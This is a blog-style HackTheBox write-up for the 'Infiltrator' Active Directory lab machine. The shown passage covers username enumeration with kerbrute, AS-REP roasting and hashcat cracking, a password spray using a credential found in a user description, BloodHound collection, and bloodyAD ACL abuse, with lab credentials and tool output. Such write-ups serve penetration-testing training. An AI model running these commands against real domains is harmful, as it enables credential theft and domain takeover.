@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Infiltrator (Insane)</title>
+    <meta name="title" content="Infiltrator (Insane)">
+    <meta name="description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the...">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/infiltrator/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/infiltrator/">
+    <meta property="og:title" content="Infiltrator (Insane)">
+    <meta property="og:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the...">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/infiltrator.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/infiltrator/">
+    <meta property="twitter:title" content="Infiltrator (Insane)">
+    <meta property="twitter:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the...">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/infiltrator.png">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="infiltrator-insane" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#infiltrator-insane">#</doc-anchor-trigger>
+        <span>Infiltrator (Insane)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-08-02</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/infiltrator.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn&#x27;t have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user <code v-pre>M.harris</code>. Once on the machine, the attacker can identify that the whole company communicates through the <code v-pre>Output Messenger</code> application. Infiltrating the application, switching users, reverse engineering a binary, and using the application&#x27;s API, he can eventually land a shell as the user <code v-pre>O.martinez</code> on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an <code v-pre>ntds.dit</code> file from which he can read sensitive user information and find a valid password for the user <code v-pre>lan_managment</code>. This new user can read the GMSA password of the user <code v-pre>infiltrator_svc$</code>. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator&#x27;s hash and compromise the whole domain through the certificate exploitation.</p>
+<doc-anchor-target id="enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<p>I ain’t wastin&#x27; time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into <strong>user enumeration</strong>.</p>
+<p>First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin&#x27;).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">David Anderson
+Olivia Martinez
+Kevin Turner
+Amanda Walker
+Marcus Harris
+Lauren Clark
+Ethan Rodriguez</code></pre>
+</doc-codeblock></div>
+<p>Now we feed these names into <code v-pre>UsernameAnarchy</code> — a beautiful little gremlin of a tool that chews on names and vomits out 6,000 permutations of corporate identity theft.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ /username-anarchy/username-anarchy --input-file users.txt &gt; probably_usernames.txt</code></pre>
+</doc-codeblock></div>
+<p>And just like that, we got a whole buffet of usernames. Next up: <strong>Kerbrute</strong>, because what’s more fun than whispering sweet nothings to Kerberos and seeing who moans back?</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d INFILTRATOR.HTB --dc 10.10.11.31 probably_usernames.txt -o valid_users
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 09/01/24 - Ronnie Flathers @ropnop
+
+2024/09/01 09:45:32 &gt;  Using KDC(s):
+2024/09/01 09:45:32 &gt;  10.10.11.31:88
+
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 d.anderson@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 o.martinez@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 k.turner@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 a.walker@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 m.harris@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 e.rodriguez@INFILTRATOR.HTB
+2024/09/01 09:45:33 &gt;  [+] VALID USERNAME:	 l.clark@INFILTRATOR.HTB</code></pre>
+</doc-codeblock></div>
+<p>Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in <code v-pre>j.smith-x98800.txt</code> was a total flop, dry as the Sahara. So, we’re calling it: this is our final crew.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">administrator@INFILTRATOR.HTB
+d.anderson@INFILTRATOR.HTB
+o.martinez@INFILTRATOR.HTB
+k.turner@INFILTRATOR.HTB
+a.walker@INFILTRATOR.HTB
+m.harris@INFILTRATOR.HTB
+e.rodriguez@INFILTRATOR.HTB
+l.clark@INFILTRATOR.HTB</code></pre>
+</doc-codeblock></div>
+<p>Time to get greasy with <strong>ASREPRoasting</strong>. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yes my dude!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User administrator@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User d.anderson@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User o.martinez@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User k.turner@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User a.walker@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User m.harris@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User e.rodriguez@INFILTRATOR.HTB doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$l.clark@INFILTRATOR.HTB@INFILTRATOR.HTB:96becffa85728f8fea33be18e9ca6164$bb2614f154c83cbcd98e1f110566be9d1ea1bd44eb7041f119b22b73bbb82175e9e7b309f518c4dab0469efcb47e15a332caf0e00f82a55ad45afed64a8b923afc1f832664f1f6eba19414e6b706933d3c27a656688f59e748ba7ca64e68647bbf113d67afe8d39d39db2ae9f8bb28383bc42f48a22969d34a21599c40d1bd240a92185222100a9787ddaaa78660197a21affdccb023e9114b51797693a6a37cfc72ac9dc300b08f9bc89a9d64c522c00a3262d67b54f34d24efdb74ad9bceae2cbaa2631c4d595162f46a7c0dcbc8607e77c71986e2a435def66cfd5a3de16aee5074dfdba977dd8d037083c189d523862e</code></pre>
+</doc-codeblock></div>
+<p>Turns out our girl <strong>l.clark</strong> out here just raw-dogging Kerberos with no protection. Naturally, we hit her with the ol’ <strong>hashcat special</strong>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 18200 lclark.hash $ROCKYOU</code></pre>
+</doc-codeblock></div>
+<p>This hash be cracking faster than a microwave burrito — and what do we get? That’s right, keys to the kingdom. VIP access. L.clark got us in the door, and now we’re poking around like we own the place.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users
+SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.31   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!</code></pre>
+</doc-codeblock></div>
+<p>With these creds on our hands, we blast <code v-pre>nxc smb</code> again and go full snoop-mode on the domain — enumerate all the users like it’s roll call at hacker high school. We also run a cheeky lil&#x27; SID lookup:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ lookupsid.py l.clark@INFILTRATOR.HTB | grep SidTypeUser
+Password: WAT?watismypass!
+500: INFILTRATOR\Administrator (SidTypeUser)
+501: INFILTRATOR\Guest (SidTypeUser)
+502: INFILTRATOR\krbtgt (SidTypeUser)
+1000: INFILTRATOR\DC01$ (SidTypeUser)
+1103: INFILTRATOR\D.anderson (SidTypeUser)
+1104: INFILTRATOR\L.clark (SidTypeUser)
+1105: INFILTRATOR\M.harris (SidTypeUser)
+1106: INFILTRATOR\O.martinez (SidTypeUser)
+1107: INFILTRATOR\A.walker (SidTypeUser)
+1108: INFILTRATOR\K.turner (SidTypeUser)
+1109: INFILTRATOR\E.rodriguez (SidTypeUser)
+1601: INFILTRATOR\winrm_svc (SidTypeUser)
+3102: INFILTRATOR\infiltrator_svc$ (SidTypeUser)</code></pre>
+</doc-codeblock></div>
+<p>We flex for a <strong>Kerberoasting</strong> round just in case someone slipped, but nah, nothing juicy. No tickets, no service accounts, just disappointment. But hold up — plot twist. Our recon pulls up a lil’ easter egg: <strong>user k.turner</strong> has a password just chillin’ in their description field. Man’s out here treating Active Directory like a Post-it note.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' --users | grep K.turner
+SMB                      10.10.11.31   445    DC01             K.turner                      2024-02-25 15:40:35 1       MessengerApp@Pass!</code></pre>
+</doc-codeblock></div>
+<p>So we take this blessed gift from k.turner’s description field and we <strong>yeet</strong> it into a password spray like we’re Oprah handing out creds:</p>
+<blockquote>
+<p><em>“You get a login! YOU get a login! ERRBODY LOGGING IN!”</em></p>
+</blockquote>
+<p>But then... Curveball. We see that both <code v-pre>m.harris</code> and <code v-pre>d.anderson</code> get the message <code v-pre>STATUS_ACCOUNT_RESTRICTION</code>. Excuse me??? Microsoft really out here like:</p>
+<blockquote>
+<p>“Woah woah woah, hold up... you <em>do</em> have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.”</p>
+</blockquote>
+<p>This ain&#x27;t a wrong password, nah. This is <strong>“you got it, but you still ain&#x27;t allowed.”</strong> That’s the cyber equivalent of your key working in the lock but some dude inside just holding the door shut whispering, <em>“not today, boi.”</em></p>
+<p>So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some <span class="docs-emoji">&#x2728;</span>emotional boundary<span class="docs-emoji">&#x2728;</span> arc and we gotta pivot.</p>
+<doc-anchor-target id="bloodhound">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound">#</doc-anchor-trigger>
+        <span>Bloodhound</span>
+    </h2>
+</doc-anchor-target>
+<p>So now that we got creds for <code v-pre>l.clark</code> (shoutout to my boy k.turner), we unleash <strong>BloodHound</strong> to sniff out the domain like a digital truffle pig.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ docker run -v ${PWD}:/bloodhound-data -it bloodhound
+$ bloodhound-python -u 'l.clark' -p 'WAT?watismypass!' -ns 10.10.11.31 -d infiltrator.htb --zip -c All</code></pre>
+</doc-codeblock></div>
+<p>We throw that juicy ZIP into BloodHound-CE like it’s an offering to the graph gods — and lo and behold, our good sis <code v-pre>l.clark</code> is chillin’ with the <strong>Marketing Team</strong>. Nothing too spicy yet, but wait... The Chiefs Marketing group has the <code v-pre>ForceChangePassword</code> on the user <code v-pre>M.Harris</code>. That&#x27;s a bingo!</p>
+<p>Meanwhile, <code v-pre>d.anderson</code> still out here on that <strong>NTLM ain’t my vibe</strong> energy — he’s vibing strictly in <strong>Kerberos-only</strong> mode. Man&#x27;s spiritually allergic to NTLM. But lucky for us, we speak fluent Kerberos. So we flex with <code v-pre>getTGT.py</code>, praying to the Impacket gods for a valid TGT:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip 10.10.11.31
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in d.anderson.ccache</code></pre>
+</doc-codeblock></div>
+<p>And BOOM — it worked. Password valid. Ticket secured. Identity stolen. Heist soundtrack intensifies. Then we casually log in like we’ve been <code v-pre>d.anderson</code> this whole time:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb infiltrator.htb -d infiltrator.htb -u 'd.anderson' -p 'WAT?watismypass!' -k</code></pre>
+</doc-codeblock></div>
+<p>But hold up... BloodHound whispers in our ear again:</p>
+<blockquote>
+<p><strong>“psst... <code v-pre>d.anderson</code> got <code v-pre>GenericAll</code> over the Marketing Digital OU...”</strong></p>
+</blockquote>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/bh-anderson.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Okay now we’re cooking. You know what that means? We can start <strong>yeeting ACLs</strong> around ike we’re modding the Minecraft server at 3AM.</p>
+<blockquote>
+<p>“You get admin perms, you get admin perms—oh look, the economy’s ruined!”</p>
+</blockquote>
+<p>So we bless our old pal <code v-pre>l.clark</code> with <strong>GenericAll</strong> over the entire OU using <code v-pre>bloodyAD</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k add genericAll 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'l.clark'
+[+] l.clark has now GenericAll on OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB</code></pre>
+</doc-codeblock></div>
+<p>That’s it. <strong>l.clark just went from running marketing reports to rewriting destiny.</strong><br />
+Let the ACL shenanigans commence.</p>
+<doc-anchor-target id="user">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
+        <span>User</span>
+    </h2>
+</doc-anchor-target>
